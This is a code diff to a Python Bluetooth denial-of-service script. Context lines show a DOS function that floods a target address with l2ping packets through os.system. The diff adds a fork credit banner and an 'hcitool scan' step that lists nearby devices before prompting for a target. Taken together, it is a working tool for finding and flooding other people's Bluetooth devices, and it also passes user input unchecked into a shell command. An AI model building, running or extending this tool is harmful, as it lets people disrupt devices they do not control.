@@ -1,6 +1,7 @@
 import os
 import threading
 import time
+import subprocess
 
 def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
@@ -17,6 +18,8 @@ def printLogo():
     print('|                                      |___/   |__/        |___/ |___/    | ')
     print('+-------------------------------------------------------------------------+ ')
     print('\x1b[0m')
+    print("forked by xanonDev")
+    print("https://github.com/xanonDev")
 
 def main():
     printLogo()
@@ -28,7 +31,12 @@ def main():
         os.system('clear')
         printLogo()
         print('')
-
+        print("Scanning ...")
+        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
+        lines = output.splitlines()
+        del lines[0]
+        for line in lines:
+            print(line)
         target_addr = input('Target addr > ')
 
         if len(target_addr) < 1:
